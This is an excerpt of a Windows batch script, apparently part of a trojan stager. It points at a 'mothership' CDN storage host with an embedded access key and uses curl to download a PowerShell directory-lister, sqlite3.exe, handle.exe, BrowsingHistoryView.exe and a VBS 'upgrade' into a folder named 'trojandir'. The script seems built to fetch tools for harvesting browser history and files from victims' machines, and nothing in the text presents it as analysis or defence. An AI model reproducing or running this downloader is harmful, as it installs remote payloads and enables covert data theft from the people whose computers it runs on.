...
REM SET jobcode=
REM SET mothership=
REM SET mothershipassets=https://ny.storage.bunnycdn.com/testdev
REM SET bunnyheader=-H "AccessKey: c64e71da-aac7-4b07-8ceb3fe9813f-af55-4d3a"
...
curl -o %workdir%\get_dir_listing.ps1 -G %mothershipassets%/ow/assets/get_dir_listing.ps1 %bunnyheader%
...
IF NOT EXIST %trojandir%\sqlite3.exe (
    curl -o %trojandir%\sqlite3.exe -G %mothershipassets%/ow/assets/sqlite3.exe %bunnyheader% > %workdir%\curl_sqlite3.log 2>&1
)
...
IF NOT EXIST %trojandir%\handle.exe (
    curl -o %trojandir%\handle.exe %mothershipassets%/ow/assets/handle.exe %bunnyheader%
)
...
IF NOT EXIST %trojandir%\BrowsingHistoryView.exe (
    curl -o %trojandir%\BrowsingHistoryView.exe %mothershipassets%/ow/assets/BrowsingHistoryView.exe %bunnyheader%
)
...
curl -o %trojandir%\zfei_upgrade.vbs -G %mothershipassets%/ow/assets/zfei.vbs %bunnyheader%
